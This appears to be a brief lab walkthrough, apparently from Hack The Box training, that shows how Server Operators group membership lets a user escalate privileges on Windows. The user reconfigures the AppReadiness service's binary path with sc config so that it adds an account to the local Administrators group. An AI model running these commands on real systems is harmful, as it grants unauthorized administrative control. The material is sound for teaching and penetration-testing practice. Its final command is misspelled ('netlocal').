Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege` privileges and the ability to control local services.
# Querying the AppReadiness Service
```
sc qc AppReadiness
```
We can confirm that this service starts as SYSTEM 
## Checking Service Permissions with PsService
```
C:\htb> c:\Tools\PsService.exe security AppReadiness
```
This confirms that the Server Operators group has SERVICE_ALL_ACCESS access right, which gives us full control over this service.
## Modifying the Service Binary Path
change the binary path to execute a command which adds our current user to the default local administrators group
```
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```
## Starting the Service
Starting the service fails, which is expected.
## Confirming Local Admin Group Membership
If we check the membership of the administrators group, we see that the command was executed successfully.
```
netlocal group Administrators
```
NOTE: You have to Sign OUT and then Sign back IN for the modification to take effect
